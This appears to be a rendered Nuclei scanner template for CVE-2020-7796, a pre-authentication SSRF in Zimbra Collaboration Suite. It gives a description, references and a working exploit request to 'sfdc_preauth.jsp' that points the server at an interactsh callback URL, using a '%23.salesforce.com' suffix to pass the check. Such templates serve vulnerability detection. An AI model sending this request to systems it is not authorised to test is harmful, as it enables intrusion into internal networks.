# Nuclei Template: Zimbra Collaboration Suite - Server-Side Request Forgery
**Template ID:** zimbra-preauth-ssrf
**Vulnerability Class:** Resource Injection
**Severity:** Critical
**CWE:** CWE-99
**Source:** Nuclei Template (`zimbra-preauth-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
Zimbra Collaboration Suite (ZCS) allows remote unauthenticated attackers to cause the product to include content returned by third-party servers and use it as its own code.

## Steps to reproduce / Exploit Payload
```http
GET /service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://{{interactsh-url}}%23.salesforce.com/ HTTP/1.1
Host: {{Hostname}}
Accept: */*
```

## References
- https://www.adminxe.com/2183.html
- https://nvd.nist.gov/vuln/detail/CVE-2020-7796
- https://wiki.zimbra.com/wiki/Zimbra_Releases/8.8.15/P7
